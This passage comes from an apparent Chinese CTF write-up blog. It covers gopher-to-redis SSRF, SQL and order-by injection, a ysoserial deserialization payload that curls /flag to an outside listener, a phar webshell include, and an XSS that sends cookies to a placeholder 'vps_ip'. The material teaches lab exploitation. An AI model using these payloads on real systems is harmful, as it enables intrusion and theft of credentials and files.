class="hljs-string">&quot;[*]在 Token 的 ID 后追加字符串造成 RCE，并利用 Hash 长度扩展攻击来计算新的 sign。&quot;</span>)    filename = rceToGetFile(token)    print(<span class="hljs-string">&quot;[+]Flag 已被保存到服务器上的文件：&quot;</span> + filename)    print(<span class="hljs-string">&quot;[*]从文件列表中获取该文件的 Token：&quot;</span>)    flag_token = getTargetFileToken(filename)    print(<span class="hljs-string">&quot;[+]Token 获取成功，Token:&quot;</span> + flag_token)    print(<span class="hljs-string">&quot;[*]正在下载结果文件：&quot;</span>)    flag = getFlag(flag_token)    print(<span class="hljs-string">&quot;[+]结果下载成功，结果：&quot;</span> + flag)</code></pre><p>找redis密码</p><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> home* <span class="hljs-number">183.129.189.60</span> <span class="hljs-number">10010</span> <span class="hljs-string">&quot;mkdir /tmp/gs/ &amp;&amp; unzip -d /tmp/gs/ /usr/bin/flag_provider-0.0.1-SNAPSHOT.jar&quot;</span><span class="hljs-attribute">python3</span> home* <span class="hljs-number">183.129.189.60</span> <span class="hljs-number">10010</span> <span class="hljs-string">&quot;find /tmp/gs -name application-prod.properties&quot;</span><span class="hljs-attribute">python3</span> home* <span class="hljs-number">183.129.189.60</span> <span class="hljs-number">10010</span> <span class="hljs-string">&quot;cat /tmp/gs/BOOT-INF/classes/application-prod*&quot;</span></code></pre><p>密码为glzjin_wants_a_girl_friend</p><p>gopher打redis，构造下get flag</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">colors</span>:</span>    reset=<span class="hljs-string">&#x27;\033[0m&#x27;</span>    red=<span class="hljs-string">&#x27;\033[31m&#x27;</span>    green=<span class="hljs-string">&#x27;\033[32m&#x27;</span>    orange=<span class="hljs-string">&#x27;\033[33m&#x27;</span>    blue=<span class="hljs-string">&#x27;\033[34m&#x27;</span><span class="hljs-built_in">print</span> colors.green + <span class="hljs-string">&quot;&quot;&quot;</span><span class="hljs-string"></span><span class="hljs-string">  ________              .__</span><span class="hljs-string"> /  _____/  ____ ______ |  |__   ___________ __ __  ______</span><span class="hljs-string">/   \  ___ /  _ \\\\____ \|  |  \_/ __ \_  __ \  |  \/  ___/</span><span class="hljs-string">\    \_\  (  &lt;_&gt; )  |_&gt; &gt;   Y  \  ___/|  | \/  |  /\___ \\</span><span class="hljs-string"> \______  /\____/|   __/|___|  /\___  &gt;__|  |____//____  &gt;</span><span class="hljs-string">        \/       |__|        \/     \/                 \/</span><span class="hljs-string">&quot;&quot;&quot;</span> + <span class="hljs-string">&quot;\n\t\t&quot;</span> + colors.blue + <span class="hljs-string">&quot;Modified: &quot;</span> + colors.orange + <span class="hljs-string">&quot;$guoke1$&quot;</span> + <span class="hljs-string">&quot;\n&quot;</span> + colors.reset<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Redis</span>():</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_Redis_ReverseShell</span>():</span>        password = <span class="hljs-string">&quot;glzjin_wants_a_girl_friend&quot;</span>        server = <span class="hljs-string">&quot;0.0.0.0&quot;</span>        payload = <span class="hljs-string">&quot;&quot;&quot;*2\r</span><span class="hljs-string">$3\r</span><span class="hljs-string">get\r</span><span class="hljs-string">$4\r</span><span class="hljs-string">flag\r</span><span class="hljs-string">*1\r</span><span class="hljs-string">$4\r</span><span class="hljs-string">quit\r</span><span class="hljs-string"></span><span class="hljs-string">&quot;&quot;&quot;</span>        authPrePayload = <span class="hljs-string">&#x27;&#x27;&#x27;*2\r</span><span class="hljs-string">$4\r</span><span class="hljs-string">AUTH\r</span><span class="hljs-string">$&#x27;&#x27;&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(password)) + <span class="hljs-string">&#x27;&#x27;&#x27;\r</span><span class="hljs-string">&#x27;&#x27;&#x27;</span>+  <span class="hljs-built_in">str</span>(password) +  <span class="hljs-string">&#x27;&#x27;&#x27;\r</span><span class="hljs-string">&#x27;&#x27;&#x27;</span>        <span class="hljs-keyword">if</span> password != <span class="hljs-string">&#x27;&#x27;</span>:            payload  = authPrePayload + payload        finalpayload = urllib.quote_plus(payload).replace(<span class="hljs-string">&quot;+&quot;</span>,<span class="hljs-string">&quot;%20&quot;</span>).replace(<span class="hljs-string">&quot;%2F&quot;</span>,<span class="hljs-string">&quot;/&quot;</span>).replace(<span class="hljs-string">&quot;%25&quot;</span>,<span class="hljs-string">&quot;%&quot;</span>).replace(<span class="hljs-string">&quot;%3A&quot;</span>,<span class="hljs-string">&quot;:&quot;</span>)        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\033[93m&quot;</span> +<span class="hljs-string">&quot;\nYour gopher link is ready to get Salve connect: \n&quot;</span>+ <span class="hljs-string">&quot;\033[0m&quot;</span>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\033[04m&quot;</span> +<span class="hljs-string">&quot;gopher://&quot;</span> + server + <span class="hljs-string">&quot;:6379/_&quot;</span> + finalpayload+ <span class="hljs-string">&quot;\033[0m&quot;</span>    get_Redis_ReverseShell()<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    Redis()</code></pre><p> 最后直接curl</p><pre><code class="hljs shell">python3 home* 183.129.189.60 10010 &quot;curl gopher://redis:6379/_%2A2%0D%0A%244%0D%0AAUTH%0D%0A%2426%0D%0Aglzjin_wants_a_girl_friend%0D%0A%2A2%0D%0A%243%0D%0Aget%0D%0A%244%0D%0Aflag%0D%0A%2A1%0D%0A%244%0D%0Aquit%0D%0A%0A&quot;</code></pre><p>构造最后记得加quit</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安恒月赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[网鼎杯 2020 朱雀组]Think Java</title>
    <link href="/2020/07/20/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Think-Java/"/>
    <url>/2020/07/20/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Think-Java/</url>
    
    <content type="html"><![CDATA[<p>扫目录或者看反编译的源码都会发现用了swagger ui，会有一个swagger-ui.html有接口文档</p><p><img src="https://s1.ax1x.com/2020/07/20/U45Qjf.png" alt="U45Qjf.png"></p><p>看源码会发现<code>/common/test/sqlDict</code>存在一个注入</p><pre><code class="hljs java">String sql = <span class="hljs-string">&quot;Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = &#x27;&quot;</span> + dbName + <span class="hljs-string">&quot;&#x27; and table_name=&#x27;&quot;</span> + TableName + <span class="hljs-string">&quot;&#x27;;&quot;</span>;</code></pre><p>可以控制传入的<code>dbName</code>，daName在另一个地方也有利用，就是jdbc连接数据库的时候，要保证连接到myapp上，为了避免改变库名，有两种payload</p><pre><code class="hljs gauss">dbName=myapp<span class="hljs-meta">#&#x27; union select user()#</span>dbName=myapp?a=&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-built_in">user</span>()<span class="hljs-meta">#</span></code></pre><p>可以从user表中注出账号密码</p><pre><code class="hljs nsis"><span class="hljs-literal">admin</span><span class="hljs-literal">admin</span>@Rrrr_ctf_asde</code></pre><p><code>/common/test/login</code>登录看看</p><pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/common/user/login</span> HTTP/1.1<span class="hljs-attribute">Host</span>: dd7df8d1-d065-496f-b97b-06502bd29bfa.node3.buuoj.cn<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0<span class="hljs-attribute">Accept</span>: */*<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate<span class="hljs-attribute">Content-Type</span>: application/json<span class="hljs-attribute">Content-Length</span>: 62<span class="hljs-attribute">Origin</span>: http://dd7df8d1-d065-496f-b97b-06502bd29bfa.node3.buuoj.cn<span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Referer</span>: http://dd7df8d1-d065-496f-b97b-06502bd29bfa.node3.buuoj.cn/swagger-ui.html&#123;  &quot;password&quot;: &quot;admin@Rrrr_ctf_asde&quot;,  &quot;username&quot;: &quot;admin&quot;&#125;HTTP/1.1 <span class="hljs-number">200</span> OK<span class="hljs-attribute">Server</span>: openresty<span class="hljs-attribute">Date</span>: Mon, 20 Jul 2020 13:15:31 GMT<span class="hljs-attribute">Content-Type</span>: application/json;charset=utf-8<span class="hljs-attribute">Content-Length</span>: 330<span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Access-Control-Allow-Headers</span>: token,Origin, X-Requested-With, Content-Type, Accept<span class="hljs-attribute">Access-Control-Allow-Methods</span>: POST, GET, PUT, OPTIONS, DELETE, PATCH<span class="hljs-attribute">Access-Control-Allow-Origin</span>: *<span class="hljs-attribute">Access-Control-Max-Age</span>: 3600&#123;&quot;data&quot;:&quot;Bearer rO0ABXNyABhjbi5hYmMuY29yZS5tb2RlbC5Vc2VyVm92RkMxewT0OgIAAkwAAmlkdAAQTGphdmEvbGFuZy9Mb25nO0wABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyAA5qYXZhLmxhbmcuTG9uZzuL5JDMjyPfAgABSgAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAAAAAAAXQABWFkbWlu&quot;,&quot;msg&quot;:&quot;登录成功&quot;,&quot;status&quot;:2,&quot;timestamps&quot;:1595250931517&#125;</code></pre><p><code>/common/test/current</code>登录可以看到信息</p><pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/common/user/current</span> HTTP/1.1<span class="hljs-attribute">Host</span>: dd7df8d1-d065-496f-b97b-06502bd29bfa.node3.buuoj.cn<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0<span class="hljs-attribute">Accept</span>: */*<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate<span class="hljs-attribute">Content-Type</span>: application/json<span class="hljs-attribute">Authorization</span>: Bearer rO0ABXNyABhjbi5hYmMuY29yZS5tb2RlbC5Vc2VyVm92RkMxewT0OgIAAkwAAmlkdAAQTGphdmEvbGFuZy9Mb25nO0wABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyAA5qYXZhLmxhbmcuTG9uZzuL5JDMjyPfAgABSgAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAAAAAAAXQABWFkbWlu<span class="hljs-attribute">Origin</span>: http://dd7df8d1-d065-496f-b97b-06502bd29bfa.node3.buuoj.cn<span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Referer</span>: http://dd7df8d1-d065-496f-b97b-06502bd29bfa.node3.buuoj.cn/swagger-ui.html<span class="hljs-attribute">Content-Length</span>: 0HTTP/1.1 <span class="hljs-number">200</span> OK<span class="hljs-attribute">Server</span>: openresty<span class="hljs-attribute">Date</span>: Mon, 20 Jul 2020 13:16:52 GMT<span class="hljs-attribute">Content-Type</span>: application/json;charset=utf-8<span class="hljs-attribute">Content-Length</span>: 108<span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Access-Control-Allow-Headers</span>: token,Origin, X-Requested-With, Content-Type, Accept<span class="hljs-attribute">Access-Control-Allow-Methods</span>: POST, GET, PUT, OPTIONS, DELETE, PATCH<span class="hljs-attribute">Access-Control-Allow-Origin</span>: *<span class="hljs-attribute">Access-Control-Max-Age</span>: 3600&#123;&quot;data&quot;:&#123;&quot;id&quot;:1,&quot;name&quot;:&quot;admin&quot;&#125;,&quot;msg&quot;:&quot;操作成功&quot;,&quot;status&quot;:1,&quot;timestamps&quot;:1595251012112&#125;</code></pre><blockquote><p>下方的特征可以作为序列化的标志参考:</p><p>一段数据以<strong>rO0AB</strong>开头，你基本可以确定这串就是JAVA序列化base64加密的数据。</p><p>或者如果以<strong>aced</strong>开头，那么他就是这一段java序列化的16进制。</p><p><a href="https://www.cnblogs.com/h3zh1/p/12914439.html">https://www.cnblogs.com/h3zh1/p/12914439.html</a></p></blockquote><p>然后用<strong>ysoserial</strong>构造payload带出flag</p><pre><code class="hljs vim">java -jar ysoserial.jar ROME <span class="hljs-string">&quot;curl http://frps:23789 -d @/flag&quot;</span>&gt; gsimport base64<span class="hljs-keyword">file</span> = <span class="hljs-keyword">open</span>(<span class="hljs-string">&quot;gs&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>)now = <span class="hljs-keyword">file</span>.<span class="hljs-keyword">read</span>()<span class="hljs-keyword">ba</span> = base64.b64encode(now)<span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;Bearer &quot;</span>+str(<span class="hljs-keyword">ba</span>, encoding = <span class="hljs-string">&quot;utf8&quot;</span>))<span class="hljs-keyword">file</span>.<span class="hljs-keyword">close</span>()</code></pre><p>输出的payload 放到Authorization:中   ,监听端口就会有flag了</p><pre><code class="hljs vim">connect <span class="hljs-keyword">to</span> [<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>] from localhost [<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>] <span class="hljs-number">41478</span>POST / HTTP/<span class="hljs-number">1.1</span>User-Agen<span class="hljs-variable">t:</span> curl/<span class="hljs-number">7.38</span>.<span class="hljs-number">0</span>Hos<span class="hljs-variable">t:</span> frp<span class="hljs-variable">s:23789</span>Accep<span class="hljs-variable">t:</span> */*Content-Length: <span class="hljs-number">42</span>Content-Type: application/<span class="hljs-keyword">x</span>-www-form-urlencodedflag&#123;ae084e5a-bcbd-<span class="hljs-number">406</span><span class="hljs-keyword">b</span>-aa5c-<span class="hljs-number">6</span>ba053ebc0bc&#125;^C sent <span class="hljs-number">0</span>, rcvd <span class="hljs-number">186</span>buu中用frp的对应的地址为 frp<span class="hljs-variable">s:</span>映射的端口</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[HBCTF2017]大美西安</title>
    <link href="/2020/07/19/HBCTF2017-%E5%A4%A7%E7%BE%8E%E8%A5%BF%E5%AE%89/"/>
    <url>/2020/07/19/HBCTF2017-%E5%A4%A7%E7%BE%8E%E8%A5%BF%E5%AE%89/</url>
    
    <content type="html"><![CDATA[<p>注册登录后在下载图片处有任意文件下载的地方有注入，可以通过注入读源码</p><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /downfile.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><span class="hljs-attribute">Host</span>: <span class="hljs-number">15</span>c<span class="hljs-number">1</span>b<span class="hljs-number">943</span>-<span class="hljs-number">5421</span>-<span class="hljs-number">4238</span>-<span class="hljs-number">866</span>a-<span class="hljs-number">45494</span>f<span class="hljs-number">2418</span>eb.node<span class="hljs-number">3</span>.buuoj.cn<span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win<span class="hljs-number">64</span>; x<span class="hljs-number">64</span>; rv:<span class="hljs-number">78</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">78</span>.<span class="hljs-number">0</span><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/webp,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">87</span><span class="hljs-attribute">Origin</span>: http://<span class="hljs-number">15</span>c<span class="hljs-number">1</span>b<span class="hljs-number">943</span>-<span class="hljs-number">5421</span>-<span class="hljs-number">4238</span>-<span class="hljs-number">866</span>a-<span class="hljs-number">45494</span>f<span class="hljs-number">2418</span>eb.node<span class="hljs-number">3</span>.buuoj.cn<span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Referer</span>: http://<span class="hljs-number">15</span>c<span class="hljs-number">1</span>b<span class="hljs-number">943</span>-<span class="hljs-number">5421</span>-<span class="hljs-number">4238</span>-<span class="hljs-number">866</span>a-<span class="hljs-number">45494</span>f<span class="hljs-number">2418</span>eb.node<span class="hljs-number">3</span>.buuoj.cn/index.php?file=download<span class="hljs-attribute">Cookie</span>: PHPSESSID=<span class="hljs-number">7</span>ecl<span class="hljs-number">0</span>gl<span class="hljs-number">03</span>q<span class="hljs-number">6</span>hn<span class="hljs-number">6</span>sojl<span class="hljs-number">4</span>iigekq<span class="hljs-number">7</span><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><span class="hljs-attribute">image</span>=-<span class="hljs-number">1</span> uniounionn sselectelect <span class="hljs-number">0</span>x<span class="hljs-number">696</span>e<span class="hljs-number">6465782</span>e<span class="hljs-number">706870</span>&amp;image_download=%E<span class="hljs-number">6</span>%<span class="hljs-number">94</span>%B<span class="hljs-number">6</span>%E<span class="hljs-number">8</span>%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F</code></pre><p>由于都经过了addslashes，引号都被转义了，所以用hex</p><p>下载源码发现index.php中</p><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">include</span>(<span class="hljs-variable">$filename</span>))</code></pre><p>可以利用phar协议包含压缩包中的php文件达到getshell的目的</p><p>写一个一句话1.php，压缩为zip改后缀为jpg，上传。然后关键的一步就是找到文件名了，看到upload.php</p><pre><code class="hljs php"><span class="hljs-variable">$fileNewName</span> = <span class="hljs-string">&#x27;./Up10aDs/&#x27;</span> . random_str() .<span class="hljs-string">&#x27;.&#x27;</span>.pathinfo(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],PATHINFO_EXTENSION);<span class="hljs-comment">## config.php中函数</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">random_str</span>(<span class="hljs-params"><span class="hljs-variable">$length</span> = <span class="hljs-string">&quot;32&quot;</span></span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-variable">$set</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;c&quot;</span>,  <span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-string">&quot;f&quot;</span>,         <span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-string">&quot;h&quot;</span>, <span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-string">&quot;j&quot;</span>, <span class="hljs-string">&quot;k&quot;</span>, <span class="hljs-string">&quot;l&quot;</span>,        <span class="hljs-string">&quot;m&quot;</span>,<span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-string">&quot;o&quot;</span>, <span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;q&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>,<span class="hljs-string">&quot;s&quot;</span>,<span class="hljs-string">&quot;t&quot;</span>,<span class="hljs-string">&quot;u&quot;</span>,<span class="hljs-string">&quot;v&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>,<span class="hljs-string">&quot;x&quot;</span>,        <span class="hljs-string">&quot;y&quot;</span>,<span class="hljs-string">&quot;z&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-string">&quot;6&quot;</span>, <span class="hljs-string">&quot;7&quot;</span>, <span class="hljs-string">&quot;8&quot;</span>, <span class="hljs-string">&quot;9&quot;</span>);    <span class="hljs-variable">$str</span> = <span class="hljs-string">&#x27;&#x27;</span>;    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">1</span>; <span class="hljs-variable">$i</span> &lt;= <span class="hljs-variable">$length</span>; ++<span class="hljs-variable">$i</span>) &#123;        <span class="hljs-variable">$ch</span> = mt_rand(<span class="hljs-number">0</span>, count(<span class="hljs-variable">$set</span>) - <span class="hljs-number">1</span>);        <span class="hljs-variable">$str</span> .= <span class="hljs-variable">$set</span>[<span class="hljs-variable">$ch</span>];    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;&#125;</code></pre><p>可知文件名为<code>./Up10aDs/</code>加上32为随机字母数字再加上原来的后缀名。看到downfile.php中sql语句</p><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select location from download where (uid=0 and id=&#x27;<span class="hljs-subst">$imageid</span>&#x27;) or uid=&quot;</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;userid&#x27;</span>].<span class="hljs-string">&quot; and id=<span class="hljs-subst">$imageid</span>&quot;</span>;</code></pre><p>可以利用order by注入</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> time<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">str_to_hex</span>(<span class="hljs-params">s</span>):</span>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;0x&#x27;</span>+<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(c)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s])url = <span class="hljs-string">&quot;http://b13b1410-564b-46dd-8dfe-451300cceb3e.node3.buuoj.cn/downfile.php&quot;</span>headers = &#123;  <span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&#x27;__utma=93156994.1197903980.1594909383.1594909383.1594909383.1; __utmz=93156994.1594909383.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); PHPSESSID=jlemdq0cutv92gmjfvbj215q01&#x27;</span>&#125;pay = <span class="hljs-string">&quot;123456789:abcdefghijklmnopqrstuvwxyz&#123;&quot;</span>filename=<span class="hljs-string">&quot;./Up10aDs/&quot;</span><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">40</span>):    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> pay:        fn = filename+i        payload = &#123;            <span class="hljs-string">&#x27;image&#x27;</span>: <span class="hljs-string">&#x27;2 ununionion seleselectct &#123;&#125; oorrder by 1&#x27;</span>.<span class="hljs-built_in">format</span>(str_to_hex(fn)),            <span class="hljs-string">&#x27;image_download&#x27;</span>: <span class="hljs-string">&#x27;%E6%94%B6%E8%97%8F&#x27;</span>        &#125;        response = requests.request(<span class="hljs-string">&quot;POST&quot;</span>, url, headers=headers, data=payload)        time.sleep(<span class="hljs-number">0.1</span>)        print(response.text)        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;1.php&quot;</span>  <span class="hljs-keyword">in</span> response.text:            filename=filename+<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(i)-<span class="hljs-number">1</span>)            print(filename)            <span class="hljs-keyword">break</span></code></pre><p>注意下pay字典的范围参考源码外还加了<code>:&#123;</code>，详细原因看看orderby注入的原理就晓得了</p><p><a href="https://xz.aliyun.com/t/7169">https://xz.aliyun.com/t/7169</a></p><p>然后phar协议直接引入shell</p><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">15</span>c<span class="hljs-number">1</span>b<span class="hljs-number">943</span>-<span class="hljs-number">5421</span>-<span class="hljs-number">4238</span>-<span class="hljs-number">866</span>a-<span class="hljs-number">45494</span>f<span class="hljs-number">2418</span>eb.node<span class="hljs-number">3</span>.buuoj.cn/index.php?file=phar://Up<span class="hljs-number">10</span>aDs/pqyzbqhv<span class="hljs-number">8</span>zmoeui<span class="hljs-number">8</span>vwih<span class="hljs-number">6</span>wvur<span class="hljs-number">686</span>xlz<span class="hljs-number">1</span>.jpg/<span class="hljs-number">1</span><span class="hljs-attribute">post</span>:<span class="hljs-attribute">gs</span>=phpinfo();</code></pre><p>要连蚁剑的话记得放cookie和编码器选chr，因为对post和get传的东西都过了addslashes，引号之类的都被转义了可以采用<code>chr(66).chr(66)</code>这种，选蚁剑chr的原理一样</p><p>ps. 用zip等压缩流协议都失败了，可能是include不行吗？</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>orderby注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker复现题常用命令</title>
    <link href="/2020/07/17/docker%E5%A4%8D%E7%8E%B0%E9%A2%98%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <url>/2020/07/17/docker%E5%A4%8D%E7%8E%B0%E9%A2%98%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<p>查看容器运行情况</p><p>docker ps</p><p>建立镜像<br>docker build -t sctf/UnsafeDefenseSystem .<br>创建容器  (前面的端口为宿主机端口<br>docker run -d -p 4104:8000 –name jsonhub sctf/jsonhub</p><p>删除(直接删除容器名字也行 docker rm -f  jsonhub<br>docker rm -f  76554f7ecd30</p><p>进入容器<br>docker exec -i -t  jsonhub /bin/bash</p><p>复制文件</p><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> cp /www/runoob <span class="hljs-number">96</span>f<span class="hljs-number">7</span>f<span class="hljs-number">14</span>e<span class="hljs-number">99</span>ab:/www/</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2020 De1CTF &amp; Animal Crossing</title>
    <link href="/2020/07/16/2020-De1CTF-Animal-Crossing/"/>
    <url>/2020/07/16/2020-De1CTF-Animal-Crossing/</url>
    
    <content type="html"><![CDATA[<blockquote><p>看大佬的博客，感觉很有意思，没有环境只能慢慢看wp了</p><p><a href="https://skysec.top/2020/05/03/2020%20De1CTF%20&amp;%20Animal%20Crossing/">https://skysec.top/2020/05/03/2020%20De1CTF%20&amp;%20Animal%20Crossing/</a></p></blockquote><p>script源码中<code>let data =&#39;ss&#39;;</code>,ss是输入的东西，可控。可以闭合执行script代码</p><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> data=<span class="hljs-string">&#x27;&#x27;</span>||&#123;<span class="hljs-string">&quot;valueOf&quot;</span>:<span class="hljs-keyword">new</span> <span class="hljs-string">&quot;&quot;</span>.constructor.constructor(<span class="hljs-string">&#x27;return 2&#x27;</span>)&#125;+<span class="hljs-number">1</span><span class="hljs-comment">//&#x27;</span></code></pre><p><code>+1</code> 是为了触发valueOf</p><p>为了绕过waf，用来 atob编码绕过</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encodes = <span class="hljs-string">&quot;&quot;&quot;</span><span class="hljs-string">location=&#x27;http://vps_ip?flag=&#x27;+document.cookie</span><span class="hljs-string">&quot;&quot;&quot;</span><span class="hljs-comment"># location=&#x27;http://vps_ip?flag=&#x27;+btoa(document.body.innerHTML)  读页面内容</span><span class="hljs-comment"># 获取图片</span><span class="hljs-comment"># s = &quot;&quot;&quot;</span><span class="hljs-comment"># (async()=&gt;&#123;</span><span class="hljs-comment">#     const arr = []</span><span class="hljs-comment">#     for(let i=1;i&lt;=9;i++) &#123;</span><span class="hljs-comment">#         res = await fetch(`/island/test_$0&#123;i&#125;.png`)</span><span class="hljs-comment">#         data = await res.blob()</span><span class="hljs-comment">#         const os = new FormData();</span><span class="hljs-comment">#         const mf = new File([data], &quot;name.png&quot;);</span><span class="hljs-comment">#         os.append(&quot;file&quot;, mf);</span><span class="hljs-comment">#         r = await fetch(&quot;/upload&quot;, &#123;method: &quot;POST&quot;,body: os&#125;)</span><span class="hljs-comment">#         data = await r.json()</span><span class="hljs-comment">#         arr.push(data.data)</span><span class="hljs-comment">#     &#125;</span><span class="hljs-comment">#     location=&quot;http://vps_ip/?c=&quot;+btoa(JSON.stringify(arr))</span><span class="hljs-comment"># &#125;)();</span><span class="hljs-comment"># &quot;&quot;&quot;</span>print(s)data=b64encode(s.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>).replace(<span class="hljs-string">&#x27;+&#x27;</span>, <span 